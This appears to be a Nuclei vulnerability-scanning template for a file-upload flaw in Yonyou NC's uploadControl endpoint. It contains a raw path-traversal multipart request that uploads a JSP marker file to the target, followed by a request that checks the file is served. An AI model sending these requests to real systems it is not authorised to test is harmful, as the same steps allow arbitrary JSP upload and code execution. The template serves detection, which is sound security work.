id: yongyouOA-NC-uploadControl-file-upload
info:
  name: 用友NC-uploadControl接口存在文件上传漏洞
  author: cnaq
  severity: critical
  description: 用友NC-uploadControl接口存在文件上传漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-uploadControl%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: weaver,rce

requests:
  - raw:
      - |
        POST /mp/login/../uploadControl/uploadFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
        Content-Length: 314

        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
        Content-Disposition: form-data; name="file"; filename="14113edc72.jsp"
        Content-Type: application/octet-stream

        111222111
        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
        Content-Disposition: form-data; name="submit"

        上传
        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
      - |
        GET /14113edc72.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - '111222111'